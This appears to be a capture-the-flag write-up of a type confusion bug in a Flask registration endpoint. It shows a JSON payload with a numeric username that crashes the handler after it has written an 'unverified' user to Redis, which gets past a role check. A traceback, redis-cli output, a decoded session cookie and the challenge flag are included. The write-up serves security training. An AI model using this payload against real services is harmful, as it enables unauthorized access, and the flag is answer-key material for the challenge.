# Type confusion vuln

## (dont forget to delete/reset your cookies when testing different stuff)

Register and intercept your request to look like this:

`{"username":-1,"password":"test123"}`

Setting username to a -1 instead of a string (no quotes) will cause the server to error out, yet still create a user entry in the redis cache

```
flask-1  |   File "/app/application/main.py", line 78, in register
flask-1  |     matches = re.match(username,password)
flask-1  |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^
flask-1  |   File "/usr/local/lib/python3.12/re/__init__.py", line 167, in match
flask-1  |     return _compile(pattern, flags).match(string)
flask-1  |            ^^^^^^^^^^^^^^^^^^^^^^^^
flask-1  |   File "/usr/local/lib/python3.12/re/__init__.py", line 299, in _compile
flask-1  |     raise TypeError("first argument must be string or compiled pattern")
flask-1  | TypeError: first argument must be string or compiled pattern
```

We can verify in a local docker using redis-cli that our user has been created but assigned the "unverified" role instead of the normal "user" role, bypassing the role check and allowing us to see the flag at /dashboard.

```
127.0.0.1:6379> KEYS *
1) "user:-1:password"
2) "user:-1:role"
127.0.0.1:6379> GET user:-1:role
"unverified"
```
## Upon logging in:
`Welcome admin! Here you go: SIVUSCG{h0w_b0ut_d4t}`

We can decode our JWT cookie to see what it looks like:
eyJsb2dnZWRfaW4iOnRydWUsInJvbGUiOiJ1bnZlcmlmaWVkIiwidXNlcm5hbWUiOi0xfQ.ZmWTNw.xssBgg9qoR0LAB7VqNziuOFEjhs
```
{
  "logged_in": true,
  "role": "unverified",
  "username": -1
}
```
